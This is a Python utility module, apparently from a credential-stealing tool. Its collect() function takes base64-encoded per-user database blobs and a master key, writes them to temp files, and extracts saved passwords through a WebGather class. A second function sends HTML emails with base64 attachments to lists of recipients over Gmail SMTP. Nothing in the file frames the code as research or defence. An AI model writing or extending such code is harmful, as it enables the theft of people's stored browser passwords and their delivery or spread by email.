from Cryptodome.Random import get_random_bytes
import xml.etree.ElementTree as ET
from hashlib import md5
from typing import Callable, Any
from .WebGather import WebGather
from .MailRender import MailSender
import base64
import tempfile



def GenFileName(default, rand):
    if not isinstance(rand, bytes):
        return md5(rand).hexdigest()[:20] + default
    return md5(rand.encode()).hexdigest()[:20] + default

def collect(result):
    key = base64.b64decode(result['masterKey'].encode())
    res = {}
    for i in range(len(result['jsonResult'])):
        profile = result['jsonResult'][i]['User']
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp.write(base64.b64decode(result['jsonResult'][i]['DataBase']))
            res[profile.replace(' ','_')] = WebGather(tmp.name,key ,'password').show_credentials()
    return res

def randombyte():
    b = None
    while not b:
        b = get_random_bytes(1)
    return b


def getJsonKey(dct, key, default=None):
    if isinstance(dct, dict):
        return dct.get(key, default)
    return default


def gen_xml(tag, **kwargs) -> str:
    elem = ET.Element(tag)
    for key, val in kwargs.items():
        if isinstance(val, dict):
            child = gen_xml(key, **val)
        else:
            child = ET.Element(str(key))
            child.text = str(val)
        elem.append(child)
    return ET.tostring(elem, encoding='unicode')




def tryParse(method: Callable[..., Any], value: Any, default: Any = False, **args: Any) -> Any:
    try:
        return method(value, **args)
    except:
        return default


def send_multiple_emails(
    users: list, 
    password: str, 
    From: str, 
    body: str, 
    subject: str, 
    port: int = 465, 
    files: dict = None, 
    smtp_server: str = 'smtp.gmail.com'
) -> dict:
    sender = MailSender(user=From, password=password, use_ssl=True)
    files = files or {}
    results = {}
    for user in users:
        for name, base64 in files.items():
            try:
                sender.attach_file(name=name, base64=base64)
            except Exception as e:
                print(f"Failed to attach file {name} for user {user}: {e}")
                continue
        try:
            success = sender.send_email(to=user, subject=subject, html_content=body, port=port, smtp_server=smtp_server)
            results[user] = success
        except Exception as e:
            print(f"Failed to send email to {user}: {e}")
            results[user] = False
    return results

